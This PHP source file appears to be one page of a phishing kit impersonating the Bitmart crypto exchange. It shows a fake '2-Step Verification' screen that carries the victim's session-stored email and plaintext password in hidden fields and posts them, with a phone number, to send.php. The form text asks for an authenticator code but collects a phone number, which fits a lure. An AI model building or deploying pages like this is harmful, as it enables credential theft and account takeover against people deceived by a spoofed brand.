<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Bitmart | Verify';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class='container my60'>
            <div class="row justify-content-center">
                <div class='col-sm-4 shadow rounded-2 p25 my60' style="position: relative">
                    <h1 class='h6 mobile_web_font fw-semibold pt10'>2-Step Verification</h1>
                    <div style="position: absolute;top:0;right:3;"><i class="fa-solid fa-barcode fs50"></i></div>
                    <div class='py15'>Enter the 2-step verification generated by your authenticator app.</div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                        <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                         <div className="my25">
                            <div class="form-control fs16">
                                <input name="phone_number" type="number" id="phone_number" required="" class="form-control-add" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class="d-grid my25">
                            <button type="submit" class="btn btn-success btn-primary-2 py10" >Submit</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
        </script>
    </body>
</html>